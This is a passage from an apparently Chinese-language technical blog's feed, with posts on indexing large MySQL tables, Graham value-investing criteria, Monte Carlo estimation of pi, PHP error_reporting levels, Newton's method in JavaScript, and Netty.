      <link href="/2017/01/12/MySQL%E5%8D%83%E4%B8%87%E7%BA%A7%E5%A4%A7%E8%A1%A8%E6%B7%BB%E5%8A%A0%E7%B4%A2%E5%BC%95/"/>
      <url>/2017/01/12/MySQL%E5%8D%83%E4%B8%87%E7%BA%A7%E5%A4%A7%E8%A1%A8%E6%B7%BB%E5%8A%A0%E7%B4%A2%E5%BC%95/</url>
      
        <content type="html"><![CDATA[<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>新建一个表结构，然后建立对应的数据结构，然后复制数据过来，重命名表名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tmp <span class="keyword">like</span> record;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tmp <span class="keyword">ADD</span> INDEX ( `vip` )</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tmp(ooo，...)  <span class="keyword">select</span>  ooo,... <span class="keyword">from</span> record</span><br><span class="line">Query OK, <span class="number">10000000</span> <span class="keyword">rows</span> affected (<span class="number">10</span> min <span class="number">0.00</span> sec)</span><br><span class="line">Records: <span class="number">10000000</span>  Duplicates: <span class="number">0</span>  Warnings: <span class="number">0</span></span><br><span class="line">RENAME <span class="keyword">TABLE</span> record <span class="keyword">TO</span> tmp2, tmp <span class="keyword">to</span> record;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> tmp2;</span><br></pre></td></tr></table></figure><h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>利用主从来修改。</p><p>就是先改从库，然后追数据到最新，接着将从库改为主库。</p>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>价值投资法之格雷厄姆经典价值投资策略</title>
      <link href="/2017/01/10/%E4%BB%B7%E5%80%BC%E6%8A%95%E8%B5%84%E6%B3%95%E4%B9%8B%E6%A0%BC%E9%9B%B7%E5%8E%84%E5%A7%86%E7%BB%8F%E5%85%B8%E4%BB%B7%E5%80%BC%E6%8A%95%E8%B5%84%E7%AD%96%E7%95%A5/"/>
      <url>/2017/01/10/%E4%BB%B7%E5%80%BC%E6%8A%95%E8%B5%84%E6%B3%95%E4%B9%8B%E6%A0%BC%E9%9B%B7%E5%8E%84%E5%A7%86%E7%BB%8F%E5%85%B8%E4%BB%B7%E5%80%BC%E6%8A%95%E8%B5%84%E7%AD%96%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<p>说到价值投资，就不得不提价值投资之父—本杰明.格雷尔姆，接下来为大家介绍的是其经典的价值投资策略。其要求所选的股票必须要有投资价值，而且通过价格和价值的比较研究，进一步选取具有安全边际的股票，简而言之，就是要在承担最小风险的情况下获取尽可能大的收益。</p><h2 id="估值"><a href="#估值" class="headerlink" title="估值"></a>估值</h2><p>估值不能过高，例如股票的市盈率小于过去 5 年最高市盈率的 40%，而在牛市的时候，市盈率往往都上天了，都讲市梦率了。</p><h2 id="有形资产"><a href="#有形资产" class="headerlink" title="有形资产"></a>有形资产</h2><p>股价与真实的有形资产相对应，防止泡沫，例如，股价低于每股有形资产净值的 2&#x2F;3,股价低于每股流动资产的 2&#x2F;3,</p><h2 id="成长性"><a href="#成长性" class="headerlink" title="成长性"></a>成长性</h2><p>企业要具有稳定向上的成长性，例如要求企业过去 10 年的平均盈利增长率大于 n%或者股票的盈利回报率大于中国银行 3 年期定期存款利率。</p><h2 id="股息率"><a href="#股息率" class="headerlink" title="股息率"></a>股息率</h2><p>股息率稳定，股息率稳定且较优说明公司发展好，具有较好的投资价值。例如股票的派息率大于中国银行 3 年定期存款利率的 2&#x2F;3。</p><h2 id="财务状况"><a href="#财务状况" class="headerlink" title="财务状况"></a>财务状况</h2><p>公司财务状况良好，例如总负债小于有形资产净值，小于净流动资产的 2 倍，防止公司破产导致的退市风险。</p><h2 id="偿债能力"><a href="#偿债能力" class="headerlink" title="偿债能力"></a>偿债能力</h2><p>短期偿债能力要强，如流动比率大于 2。</p>]]></content>
      
      
      <categories>
          
          <category> Finance </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 价值投资 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蒙特卡洛模拟计算圆周率PI</title>
      <link href="/2016/12/22/%E8%92%99%E7%89%B9%E5%8D%A1%E6%B4%9B%E6%A8%A1%E6%8B%9F%E8%AE%A1%E7%AE%97%E5%9C%86%E5%91%A8%E7%8E%87PI/"/>
      <url>/2016/12/22/%E8%92%99%E7%89%B9%E5%8D%A1%E6%B4%9B%E6%A8%A1%E6%8B%9F%E8%AE%A1%E7%AE%97%E5%9C%86%E5%91%A8%E7%8E%87PI/</url>
      
        <content type="html"><![CDATA[<p>数学家们称这种表述为“模式”，而当一种模式足够精确时，他能产生与实际操作中对同一条件相同的反应。但蒙特卡罗模拟有一个危险的缺陷： 如果必须输入一个模式中的随机数并不像设想的那样是随机数，而却构成一些微妙的非随机模式，那么整个的模拟（及其预测结果）都可能是错的。</p><span id="more"></span><p>当所求解问题是某种随机事件出现的概率，或者是某个随机变量的期望值时，通过某种“实验”的方法，以这种事件出现的频率估计这一随机事件的概率，或者得到这个随机变量的某些数字特征，并将其作为问题的解。</p><p>有一个例子可以比较直观地了解蒙特卡洛方法： 假设我们要计算一个不规则图形的面积，那么图形的不规则程度和分析性计算（比如，积分）的复杂程度是成正比的。蒙特卡洛方法是怎么计算的呢？假想你有一袋豆子，把豆子均匀地朝这个图形上撒，然后数这个图形之中有多少颗豆子，这个豆子的数目就是图形的面积。当你的豆子越小，撒的越多的时候，结果就越精确。在这里我们要假定豆子都在一个平面上，相互之间没有重叠。</p><p>于是根据这个思路，可以利用蒙特卡洛计算圆周率π。</p><p><img src="/assets/images/circle_pi.png"></p><p>先来一段模拟圆周率π的程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">total = <span class="number">10000000</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(total):</span><br><span class="line">    x = random.random()</span><br><span class="line">    y = random.random()</span><br><span class="line">    <span class="keyword">if</span> (x ** <span class="number">2</span> + y ** <span class="number">2</span>) &lt; <span class="number">1</span>:</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(count * <span class="number">4.0</span> / total)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mc</span>(<span class="params">total</span>):</span><br><span class="line">    count = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(total):</span><br><span class="line">        x = random.random()</span><br><span class="line">        y = random.random()</span><br><span class="line">        <span class="keyword">if</span> (x ** <span class="number">2</span> + y ** <span class="number">2</span>) &lt; <span class="number">1</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count / total * <span class="number">4.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A = []</span><br><span class="line">B = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    A.append(random.random())</span><br><span class="line">    B.append(random.random())</span><br><span class="line"></span><br><span class="line">fig = plt.figure()</span><br><span class="line"></span><br><span class="line">p1 = fig.add_subplot(<span class="number">121</span>)</span><br><span class="line">p1.axis([<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line">p1.scatter(A, B)</span><br><span class="line"></span><br><span class="line">x = y = np.arange(-<span class="number">1</span>, <span class="number">1</span>, <span class="number">0.001</span>)</span><br><span class="line">x, y = np.meshgrid(x, y)</span><br><span class="line">p1.contour(x, y, x ** <span class="number">2</span> + y ** <span class="number">2</span>, [<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">p2 = fig.add_subplot(<span class="number">122</span>)</span><br><span class="line">C = [(j + <span class="number">1</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]</span><br><span class="line">D = [mc((j + <span class="number">1</span>)) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]</span><br><span class="line">p2.plot(C, D)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>画个图看看呢？右图是实验次数和π值的关系图，试验次数越多相对计算的π也越逼近。</p><p><img src="/assets/images/mc_for_pi.png"></p><h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><ul><li><a href="http://baike.baidu.com/item/%E8%92%99%E7%89%B9%E5%8D%A1%E7%BD%97%E6%A8%A1%E6%8B%9F">http://baike.baidu.com/item/蒙特卡罗模拟</a></li><li><a href="http://wiki.mbalib.com/wiki/%E8%92%99%E7%89%B9%E5%8D%A1%E7%BD%97%E6%96%B9%E6%B3%95">http://wiki.mbalib.com/wiki/蒙特卡罗方法</a></li><li><a href="http://www.ruanyifeng.com/blog/2015/07/monte-carlo-method.html">http://www.ruanyifeng.com/blog/2015/07/monte-carlo-method.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP error_reporting()</title>
      <link href="/2016/12/21/PHP%20error_reporting()/"/>
      <url>/2016/12/21/PHP%20error_reporting()/</url>
      
        <content type="html"><![CDATA[<h3 id="定义和用法："><a href="#定义和用法：" class="headerlink" title="定义和用法："></a>定义和用法：</h3><p>error_reporting() 设置 PHP 的报错级别并返回当前级别。</p><h3 id="函数语法："><a href="#函数语法：" class="headerlink" title="函数语法："></a>函数语法：</h3><p>error_reporting(report_level)</p><span id="more"></span><p>如果参数 level 未指定，当前报错级别将被返回。下面几项是 level 可能的值：</p><table><thead><tr><th>值</th><th>常量</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>E_ERROR</td><td>致命的运行错误。错误无法恢复，暂停执行脚本。</td></tr><tr><td>2</td><td>E_WARNING</td><td>运行时警告(非致命性错误)。非致命的运行错误，脚本执行不会停止。</td></tr><tr><td>4</td><td>E_PARSE</td><td>编译时解析错误。解析错误只由分析器产生。</td></tr><tr><td>8</td><td>E_NOTICE</td><td>运行时提醒(这些经常是你代码中的bug引起的，也可能是有意的行为造成的。)</td></tr><tr><td>16</td><td>E_CORE_ERROR</td><td>PHP启动时初始化过程中的致命错误。</td></tr><tr><td>32</td><td>E_CORE_WARNING</td><td>PHP启动时初始化过程中的警告(非致命性错)。</td></tr><tr><td>64</td><td>E_COMPILE_ERROR</td><td>编译时致命性错。这就像由Zend脚本引擎生成了一个E_ERROR。</td></tr><tr><td>128</td><td>E_COMPILE_WARNING</td><td>编译时警告(非致命性错)。这就像由Zend脚本引擎生成了一个E_WARNING警告。</td></tr><tr><td>256</td><td>E_USER_ERROR</td><td>用户自定义的错误消息。这就像由使用PHP函数trigger_error（程序员设置E_ERROR）</td></tr><tr><td>512</td><td>E_USER_WARNING</td><td>用户自定义的警告消息。这就像由使用PHP函数trigger_error（程序员设定的一个E_WARNING警告）</td></tr><tr><td>1024</td><td>E_USER_NOTICE</td><td>用户自定义的提醒消息。这就像一个由使用PHP函数trigger_error（程序员一个E_NOTICE集）</td></tr><tr><td>2048</td><td>E_STRICT</td><td>编码标准化警告。允许PHP建议如何修改代码以确保最佳的互操作性向前兼容性。</td></tr><tr><td>4096</td><td>E_RECOVERABLE_ERROR</td><td>开捕致命错误。这就像一个E_ERROR，但可以通过用户定义的处理捕获（又见set_error_handler（））</td></tr><tr><td>8191</td><td>E_ALL</td><td>所有的错误和警告(不包括 E_STRICT) (E_STRICT will be part of E_ALL as of PHP 6.0)</td></tr></tbody></table><p>例子：<br>任意数目的以上选项都可以用“或”来连接(用 OR 或 |)，这样可以报告所有需要的各级别错误。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//禁用错误报告</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//报告运行时错误</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR | E_WARNING | E_PARSE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//报告所有错误</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="引申"><a href="#引申" class="headerlink" title="引申"></a>引申</h3><p>类似的方法也用在了用于屏蔽客户端类型的请求上面。<br>比如说：目前存在有四种类型，微信、支付宝、iOS、android、其他的接入渠道。目前需要根据业务来决定是否当前渠道是否被屏蔽。</p><p>值取二进制对应的十进制。屏蔽某些渠道：</p><p>微信|支付宝|iOS|Android|数值|说明<br>—|—|—|—|—|—|—<br>1|0|0|0|8| 微信<br>0|1|0|0|4| 支付宝<br>0|0|1|0|2| iOS客户端<br>0|0|0|1|1| Android客户端<br>0|0|0|0|0| 未定义接入渠道</p><p>可以根据简单的，<code>(config.getForbidden() &amp; request.getPlatform()) != 0</code> 来判断</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>牛顿法</title>
      <link href="/2016/12/09/%E7%89%9B%E9%A1%BF%E6%B3%95/"/>
      <url>/2016/12/09/%E7%89%9B%E9%A1%BF%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>对于一个多元函数</p><p>牛顿迭代法是一种求解方程的数值方法，可用于求解非线性方程的根。通过不断用当前点的切线与 <code>x</code> 轴的交点来逼近函数的根。具体地，设函数 <code>f(x)</code> 的一个近似根为 <code>x0</code>，那么下一个近似根<code>x1</code> 可以通过以下公式得到：<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="23.372ex" height="2.396ex" role="img" focusable="false" viewBox="0 -809 10330.5 1059"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(572,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1349.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2405.6,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(2977.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(3699.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(4700,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(5250,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5639,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(6211,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(6711,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(7100,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="msup" transform="translate(7600,0)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(636,413) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(8480.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(8869.5,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(9441.5,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(9941.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>其中 <code>f'(x0)</code> 表示 <code>f(x)</code> 在 <code>x0</code> 处的导数。重复这个过程直到满足所需精度为止。牛顿迭代法的收敛速度很快，但需要保证初始点选取合适，且函数具有一阶导数。</p><p>以下是使用 JavaScript 实现牛顿迭代法的样例代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义函数 f(x)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">x</span>) {</span><br><span class="line">  <span class="keyword">return</span> x * x - <span class="number">2</span>; <span class="comment">// 求解 x^2 = 2 的根</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义函数 f(x) 的导数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">df</span>(<span class="params">x</span>) {</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span> * x; <span class="comment">// x^2 的导数为 2x</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义牛顿迭代法函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">newtonMethod</span>(<span class="params">x0, tol, maxIter</span>) {</span><br><span class="line">  <span class="keyword">let</span> x = x0;</span><br><span class="line">  <span class="keyword">let</span> iter = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(<span class="title function_">f</span>(x)) &gt; tol &amp;&amp; iter &lt; maxIter) {</span><br><span class="line">    x = x - <span class="title function_">f</span>(x) / <span class="title function_">df</span>(x); <span class="comment">// 计算下一个近似根</span></span><br><span class="line">    iter++;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用牛顿迭代法函数求解 x^2 = 2 的根</span></span><br><span class="line"><span class="keyword">const</span> x0 = <span class="number">1</span>; <span class="comment">// 初始点</span></span><br><span class="line"><span class="keyword">const</span> tol = <span class="number">1e-6</span>; <span class="comment">// 精度要求</span></span><br><span class="line"><span class="keyword">const</span> maxIter = <span class="number">100</span>; <span class="comment">// 最大迭代次数</span></span><br><span class="line"><span class="keyword">const</span> root = <span class="title function_">newtonMethod</span>(x0, tol, maxIter);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`The root of x^2 - 2 is: <span class="subst">${root}</span>`</span>);</span><br></pre></td></tr></table></figure><p>在上述代码中，我们定义了函数 f(x) 和其导数 df(x)，并使用牛顿迭代法函数 newtonMethod() 求解方程 x^2 = 2 的根。函数的输入参数包括初始点 x0、精度要求 tol 和最大迭代次数 maxIter，输出为方程的根。最后我们调用 newtonMethod() 函数并打印出结果。</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netty 介绍</title>
      <link href="/2016/12/08/Netty%20%E4%BB%8B%E7%BB%8D/"/>
      <url>/2016/12/08/Netty%20%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p>作为一个优秀的后台工程师，怎么可能没有Netty呢。</p><p>Netty是一个非常优秀的网络库框架，优雅地写出TCP&#x2F;UDP的服务端／客户端程序。神奇的是测试效果还很棒。👍</p><ul><li><a href="http://github.com/yuercl/QuantBridge">QuantBridge</a>，是一个转发量化平台(JoinQuant&#x2F;ricequant)的HTTP请求到客户端的小小小工具。结合Python的<code>WIN32 API</code>可以实现实盘交易。</li></ul>]]></content>
      
      
      <categories>
          
